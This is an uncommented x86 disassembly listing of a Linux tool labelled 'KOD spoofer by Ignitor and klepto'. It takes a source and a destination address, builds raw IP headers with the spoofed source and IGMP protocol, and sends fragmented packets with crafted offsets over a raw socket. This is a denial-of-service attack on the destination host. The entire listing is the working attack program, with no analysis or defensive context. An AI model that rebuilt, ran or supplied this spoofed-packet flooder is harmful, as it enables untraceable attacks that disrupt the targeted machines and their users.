xor ebp, ebp
pop esi
mov ecx, esp
and esp, 0xfffffff8
push eax
push esp
push edx
push loc.gcc2_compiled._3
push sym._init
push ecx
push esi
push main
call sym.imp.__libc_start_main
jmp dword [reloc.__libc_start_main]
push ebp
mov ebp, esp
cmp dword [obj.completed.3], 0
jne 0x8048574
jmp 0x804854d
mov esi, esi
lea edx, [eax + 4]
mov dword [obj.p.2], edx
mov eax, dword [eax]
call eax
mov eax, dword [obj.p.2]
cmp dword [eax], 0
jne 0x8048540
mov eax, sym.imp.__deregister_frame_info
test eax, eax
je 0x804856a
push obj.__EH_FRAME_BEGIN__
call sym.imp.__deregister_frame_info
mov dword [obj.completed.3], 1
mov esp, ebp
pop ebp
ret
push ebp
mov ebp, esp
mov esp, ebp
pop ebp
ret
push ebp
mov ebp, esp
mov eax, sym.imp.__register_frame_info
test eax, eax
je 0x80485ab
push obj.object.8
push obj.__EH_FRAME_BEGIN__
call sym.imp.__register_frame_info
mov esp, ebp
pop ebp
ret
jmp dword [reloc.__register_frame_info]
push ebp
mov ebp, esp
mov esp, ebp
pop ebp
ret
push ebp
mov ebp, esp
push ebx
mov ebx, obj.__CTOR_LIST__
cmp dword [obj.__CTOR_LIST__], 0xffffffff
je 0x80489c0
mov esi, esi
mov eax, dword [ebx]
call eax
add ebx, 0xfffffffc
cmp dword [ebx], 0xffffffff
jne 0x80489b4
mov ebx, dword [var_4h]
mov esp, ebp
pop ebp
ret
push ebp
mov ebp, esp
mov esp, ebp
pop ebp
ret
push ebp
mov ebp, esp
sub esp, 8
mov eax, dword [arg_8h]
push eax
call sym.imp.gethostbyname
add esp, 4
mov eax, eax
mov dword [var_4h], eax
cmp dword [var_4h], 0
jne 0x80485f0
mov eax, 0xffffffff
jmp 0x8048620
lea esi, [esi]
lea edi, [edi]
mov eax, dword [var_4h]
mov edx, dword [eax + 0xc]
push edx
mov eax, dword [var_4h]
mov edx, dword [eax + 0x10]
mov eax, dword [edx]
push eax
lea eax, [s1]
push eax
call sym.imp.memcpy
add esp, 0xc
mov edx, dword [s1]
mov eax, edx
jmp 0x8048620
lea esi, [esi]
lea edi, [edi]
mov esp, ebp
pop ebp
ret
push ebp
mov ebp, esp
push ebx
call 0x80483f1
pop ebx
add ebx, 0x16c7
cmp dword [ebx + 0x40], 0
je 0x8048406
call loc.imp.__gmon_start__
mov esi, esi
call sym.frame_dummy
call loc.gcc2_compiled._2
mov ebx, dword [var_4h]
leave
ret
push ebp
mov ebp, esp
sub esp, 0x60c
mov dword [var_28h], 0
cmp dword [argv], 2
jg 0x8048670
push str.KOD_spoofer_by_Ignitor_and_klepto_n
call sym.imp.printf
add esp, 4
mov eax, dword [envp]
mov edx, dword [eax]
push edx
push str.Usage:__s__src___dst__n
call sym.imp.printf
add esp, 8
mov eax, 1
jmp 0x8048900
mov eax, dword [envp]
add eax, 8
mov edx, dword [eax]
push edx
call loc.gcc2_compiled._4
add esp, 4
mov eax, eax
mov dword [var_1ch], eax
mov eax, dword [envp]
add eax, 4
mov edx, dword [eax]
push edx
call loc.gcc2_compiled._4
add esp, 4
mov eax, eax
mov dword [var_20h], eax
push 0x5dc
push 0
lea eax, [s]
push eax
call sym.imp.memset
add esp, 0xc
lea ecx, [s]
mov dword [var_14h], ecx
lea eax, [s]
lea ecx, [eax + 0x14]
mov dword [var_18h], ecx
mov eax, dword [var_1ch]
mov dword [var_ch], eax
mov word [var_10h], 2
mov eax, dword [var_14h]
and byte [eax], 0xf0
or byte [eax], 5
mov eax, dword [var_14h]
and byte [eax], 0xf
or byte [eax], 0x40
mov eax, dword [var_14h]
mov byte [eax + 1], 0
push 0x2ab5
call sym.imp.htons
add esp, 4
mov eax, eax
mov edx, dword [var_14h]
mov word [edx + 2], ax
push 0xbe08
call sym.imp.htons
add esp, 4
mov eax, eax
mov edx, dword [var_14h]
mov word [edx + 4], ax
mov eax, dword [var_14h]
mov byte [eax + 8], 0x40
mov eax, dword [var_14h]
mov byte [eax + 9], 2
push 0x14
mov eax, dword [var_14h]
push eax
call sym.in_chksum
add esp, 8
mov eax, eax
mov edx, dword [var_14h]
mov word [edx + 0xa], ax
mov eax, dword [var_14h]
mov edx, dword [var_20h]
mov dword [eax + 0xc], edx
mov eax, dword [var_14h]
mov edx, dword [var_1ch]
mov dword [eax + 0x10], edx
push 0xff
push 3
push 2
call sym.imp.socket
add esp, 0xc
mov eax, eax
mov dword [var_24h], eax
cmp dword [var_24h], 0xffffffff
jne 0x8048780
mov eax, 1
jmp 0x8048900
lea esi, [esi]
lea edi, [edi]
mov eax, dword [envp]
add eax, 8
mov edx, dword [eax]
push edx
mov eax, dword [envp]
add eax, 4
mov edx, dword [eax]
push edx
push str.Sending_IGMP_packets:__s_____s_n
call sym.imp.printf
add esp, 0xc
mov dword [var_2ch], 0
mov esi, esi
cmp dword [var_2ch], 1
jle 0x80487c0
jmp 0x80488f0
lea esi, [esi]
lea edi, [edi]
mov dword [var_30h], 0xdc
push 0x73a
call sym.imp.htons
add esp, 4
mov eax, eax
mov edx, dword [var_14h]
mov word [edx + 6], ax
mov dword [var_28h], 0
push 0x10
lea edx, [var_10h]
mov eax, edx
push eax
push 0
mov eax, dword [var_30h]
push eax
lea eax, [s]
push eax
mov eax, dword [var_24h]
push eax
call sym.imp.sendto
add esp, 0x18
mov eax, eax
cmp eax, 0xffffffff
jne 0x8048830
push str.Error_sending_packet
call sym.imp.perror
add esp, 4
push 0xffffffffffffffff
call sym.imp.exit
add esp, 4
lea esi, [esi]
lea edi, [edi]
mov eax, dword [var_14h]
xor edx, edx
mov dx, word [eax + 6]
push edx
call sym.imp.ntohs
add esp, 4
mov eax, eax
cmp ax, 0x2000
jne 0x8048850
jmp 0x80488e0
nop
mov dword [var_30h], 0x5dc
cmp dword [var_28h], 0
jne 0x8048880
push 0x2681
call sym.imp.htons
add esp, 4
mov eax, eax
mov edx, dword [var_14h]
mov word [edx + 6], ax
jmp 0x80488b3
lea esi, [esi]
lea edi, [edi]
mov eax, dword [var_14h]
xor edx, edx
mov dx, word [eax + 6]
push edx
call sym.imp.ntohs
add esp, 4
mov eax, eax
mov edx, eax
add edx, 0xffffff47
xor eax, eax
mov ax, dx
push eax
call sym.imp.htons
add esp, 4
mov eax, eax
mov edx, dword [var_14h]
mov word [edx + 6], ax
push 0x14
mov eax, dword [var_14h]
push eax
call sym.in_chksum
add esp, 8
mov eax, eax
mov edx, dword [var_14h]
mov word [edx + 0xa], ax
inc dword [var_28h]
jmp 0x80487e4
lea esi, [esi]
lea edi, [edi]
inc dword [var_2ch]
jmp 0x80487a8
nop
lea esi, [esi]
mov eax, 1
jmp 0x8048900
mov esi, esi
lea edi, [edi]
mov esp, ebp
pop ebp
ret
push ebp
mov ebp, esp
push ebx
call 0x80489e1
pop ebx
add ebx, 0x10d7
call loc.gcc2_compiled._1
mov ebx, dword [var_4h]
leave
ret
push ebp
mov ebp, esp
sub esp, 4
push esi
push ebx
mov edx, dword [arg_ch]
xor ecx, ecx
mov word [var_2h], 0
nop
cmp edx, 1
jg 0x8048930
jmp 0x8048950
nop
lea esi, [esi]
mov eax, dword [arg_8h]
xor ebx, ebx
mov bx, word [eax]
add ecx, ebx
add dword [arg_8h], 2
add edx, 0xfffffffe
jmp 0x8048924
lea esi, [esi]
lea edi, [edi]
cmp edx, 1
jne 0x8048965
mov eax, dword [arg_8h]
mov bl, byte [eax]
mov byte [var_2h], bl
xor eax, eax
mov ax, word [var_2h]
add ecx, eax
mov eax, ecx
sar eax, 0x10
mov ebx, ecx
and ebx, 0xffff
lea ecx, [ebx + eax]
mov eax, ecx
sar eax, 0x10
add ecx, eax
mov esi, ecx
not si
mov word [var_2h], si
xor ebx, ebx
mov bx, word [var_2h]
mov eax, ebx
jmp 0x804898f
lea esp, [var_ch]
pop ebx
pop esi
mov esp, ebp
pop ebp
ret
jmp dword [reloc.printf]
jmp dword [reloc.memcpy]
jmp dword [reloc.perror]
jmp dword [reloc.socket]
jmp dword [reloc.__deregister_frame_info]
jmp dword [reloc.sendto]
jmp dword [reloc.memset]
jmp dword [reloc.ntohs]
jmp dword [reloc.gethostbyname]
jmp dword [reloc.htons]
jmp dword [reloc.exit]
